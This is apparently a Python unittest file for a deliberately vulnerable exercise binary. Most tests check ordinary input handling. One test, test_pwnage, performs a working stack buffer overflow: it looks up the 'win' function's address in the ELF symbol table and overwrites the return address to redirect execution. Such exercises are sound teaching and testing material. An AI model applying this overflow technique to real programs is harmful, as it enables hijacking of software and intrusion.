#! /usr/bin/env python3

import struct
import subprocess
import sys
import unittest

# from wherever
import deco

from elftools.elf.elffile import ELFFile

class Tests(unittest.TestCase):
    def test_no_args(self):
        result = deco.run([])
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr,    '')
        self.assertEqual(result.stdout,    '')

    def test_regular(self):
        result = deco.run(['14', 'seven chickens'])
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr,    '')
        self.assertEqual(result.stdout,
            'SIZE: 14\n'
            'Got: seven chickens\n'
        )

    def test_too_long(self):
        result = deco.run(['255', 'Actually I lied...'])
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr,    '')
        self.assertEqual(result.stdout,
            'SIZE: 255\n'
            'Too long!\n'
        )

    def test_pwnage(self):
        def get_address():
            with open(deco.PATH, 'rb') as file:
                elf    = ELFFile(file)
                symtab = elf.get_section_by_name('.symtab')
                if not symtab:
                    self.fail('No symbol table.')
                for symbol in symtab.iter_symbols():
                    if symbol.name == 'win':
                        return symbol.__dict__['entry']['st_value']
            self.fail('Not enough win.')

        address = struct.pack('<Q', get_address())
        payload = (b'A'*256 + b'B'*8 + address).rstrip(b'\x00')
        result  = subprocess.run([deco.PATH, str(len(payload)), payload],
            stdout  = subprocess.PIPE,
            stderr  = subprocess.PIPE,
            timeout = 0.1
        )

        self.assertEqual(result.returncode, 42)
        self.assertEqual(result.stderr,    b'')
        self.assertEqual(
            b'SIZE: 11\n'
            b'Got: ' + payload + b'\n'
            b'How did you get here??\n',
            result.stdout
        )


if __name__ == '__main__':
    deco.main(sys.argv)
